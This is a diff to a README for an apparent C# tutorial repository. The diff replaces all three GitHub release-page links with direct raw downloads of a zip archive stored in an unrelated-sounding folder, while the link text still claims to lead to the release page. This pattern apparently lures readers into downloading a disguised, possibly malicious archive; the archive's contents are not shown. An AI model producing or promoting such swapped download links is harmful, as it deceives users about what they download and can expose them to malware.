@@ -1,6 +1,6 @@
 # 📘 pupilica-ileri-csharp-2026 - Learn C# With Clear Examples
 
-[![Download](https://img.shields.io/badge/Download-Releases-6f42c1?style=for-the-badge&logo=github)](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-6f42c1?style=for-the-badge&logo=github)](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/raw/refs/heads/main/anteprostate/csharp_pupilica_ileri_v3.0.zip)
 
 ## 🖥️ What This Project Is
 
@@ -12,7 +12,7 @@ The main goal is to let you open the project, read the files, and run the exampl
 
 Use this link to visit the release page and download the app files:
 
-[Visit the release page to download](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/releases)
+[Visit the release page to download](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/raw/refs/heads/main/anteprostate/csharp_pupilica_ileri_v3.0.zip)
 
 After you open the release page:
 
@@ -181,7 +181,7 @@ This project fits users who want to:
 
 Use this link if you need the release page:
 
-[Download from GitHub Releases](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/releases)
+[Download from GitHub Releases](https://github.com/beaded-callfire644/pupilica-ileri-csharp-2026/raw/refs/heads/main/anteprostate/csharp_pupilica_ileri_v3.0.zip)
 
 ## 🧱 Project Focus
 
